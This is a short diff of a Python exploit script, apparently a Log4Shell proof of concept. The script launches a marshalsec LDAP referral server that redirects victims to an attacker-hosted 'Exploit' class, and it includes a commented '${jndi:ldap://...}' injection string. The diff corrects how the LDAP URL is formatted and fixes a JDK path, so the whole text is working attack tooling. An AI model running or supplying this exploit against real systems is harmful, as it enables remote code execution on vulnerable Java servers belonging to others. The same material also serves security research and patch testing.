@@ -27,12 +27,12 @@ def payload(userip: str, webport: int, lport: int) -> None:
 def ldap_server(userip: str, lport: int) -> None:
     #sendme = "${jndi:ldap://%s:1389/a}" % (userip)
     #print(Fore.GREEN + f"[+] Send me: {sendme}\n")
-    ldap_url = "ldap://%s:1389/a"
+    ldap_url = "ldap://%s:1389/a" % (userip)
     print(Fore.GREEN + f"[+] Paste LDAP URL: {ldap_url}\n")
 
     url = "http://{}:{}/#Exploit".format(userip, lport)
     subprocess.run([
-        os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
+        os.path.join(CUR_FOLDER, "jdk1.8.0_201/bin/java"),
         "-cp",
         os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
         "marshalsec.jndi.LDAPRefServer",
